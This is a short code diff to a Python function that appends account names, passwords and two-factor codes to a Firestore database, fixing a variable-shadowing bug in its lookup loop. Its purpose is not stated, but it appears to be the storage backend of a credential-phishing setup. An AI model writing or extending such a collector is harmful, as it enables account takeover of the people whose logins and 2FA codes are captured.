@@ -12,10 +12,9 @@ db = firestore.client(app)
 
 def send(loai,tk,mk,name,FACode):
     loi = 1
-    doc_ref = db.collection(loai).get()
-    print(doc_ref)
-    for name in doc_ref:
-        if name.strip() == name.id:
+    doc_ref = db.collection(name).get()
+    for namex in doc_ref:
+        if name.strip() == namex.id:
             db.collection(loai).document(name).update({'data':firestore.ArrayUnion([{'TK':tk,'MK':mk,'2FA':FACode}])}) 
             loi = 0
 
